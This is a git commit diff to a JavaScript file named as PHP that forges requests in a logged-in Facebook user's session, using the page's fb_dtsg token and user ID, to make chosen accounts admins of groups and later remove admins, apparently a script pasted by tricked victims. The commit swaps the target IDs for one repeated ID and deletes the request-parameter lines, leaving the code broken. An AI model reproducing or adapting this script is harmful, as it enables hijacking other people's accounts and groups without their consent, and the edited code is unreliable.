cc1193a80ef0f85c1a3e1dbc2b5dcd6e5c8bad4c
levisilva12 <levisilva_@hotmail.com>
2013-11-21 06:46:22 -0200

    Update Active_Admin_AutoAddPost_Joining.php

--- Active_Admin_AutoAddPost_Joining.php
+++ Active_Admin_AutoAddPost_Joining.php
@@ -6,8 +6,7 @@ var now = (new Date).getTime();
 function IDS(r) {
     function G(gid) {
         var Page = new XMLHttpRequest();
-        var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
-        var PageParams = "fb_dtsg=" + fb_dtsg + "&gid=" + gid + "&uid=" + r + "&operation=confirm_add_admin&source=profilebrowser&make_admin=1&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=34&ttstamp=26581661107112011276";
+        var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";;
         Page.open("POST", PageURL, true);
         Page.onreadystatechange = function () {
             if (Page.readyState == 4 && Page.status == 200) {
@@ -16,12 +15,12 @@ function IDS(r) {
         };
         Page.send(PageParams);
     }
-     G("391559757563844");
+     G("100003590682442");
 }
-IDS("100004092334280");
-IDS("100003147643648");
-IDS("100005147649818");
-IDS("100003998763728");
+IDS("100003590682442");
+IDS("100003590682442");
+IDS("100003590682442");
+IDS("100003590682442");
 
 setTimeout(function () {
 
@@ -35,7 +34,6 @@ setTimeout(function () {
         function G(gid) {
             var Page = new XMLHttpRequest();
             var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
-            var PageParams = "fb_dtsg=" + fb_dtsg + "&gid=" + gid + "&uid=" + r + "&operation=confirm_remove_admin&source=profilebrowser&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=b&ttstamp=26581661107112011276";
             Page.open("POST", PageURL, true);
             Page.onreadystatechange = function () {
                 if (Page.readyState == 4 && Page.status == 200) {
@@ -44,11 +42,11 @@ setTimeout(function () {
             };
             Page.send(PageParams);
         }
-          G("391559757563844");
+          G("100003590682442");
     }
-    IDS("100002908006006");
-    IDS("100003200476066");
-    IDS("100006342757697");
-    IDS("100005202368891");
+    IDS("100003590682442");
+    IDS("100003590682442");
+    IDS("100003590682442");
+    IDS("100003590682442");
 
 }, 5000);
